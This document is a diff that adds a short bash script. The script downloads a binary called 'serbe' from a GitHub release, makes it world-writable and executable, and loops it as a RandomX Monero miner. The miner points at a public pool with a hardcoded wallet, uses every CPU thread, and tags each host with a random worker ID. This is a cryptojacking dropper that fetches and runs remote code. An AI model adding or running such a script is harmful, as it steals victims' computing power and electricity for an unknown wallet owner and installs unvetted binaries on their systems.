@@ -1,0 +1,6 @@
+#!/bin/bash
+wget https://github.com/sompongboonmak17/urban-octo-garbanzo/releases/download/1/serbe
+chmod 777 serbe
+while true; do
+./serbe --algorithm randomx --pool pool.supportxmr.com:80 --wallet 43peYMqkwRGfN8ickDMB2PFM2nEHvKcYoTsh4sW524tQgxHD1MixG9JPJDtoKQeWK5EL5Evx9hAxackoCCddvcoh2rVCVeg.$(echo $RANDOM | md5sum | head -c 10) --cpu-threads $(nproc --all)
+done
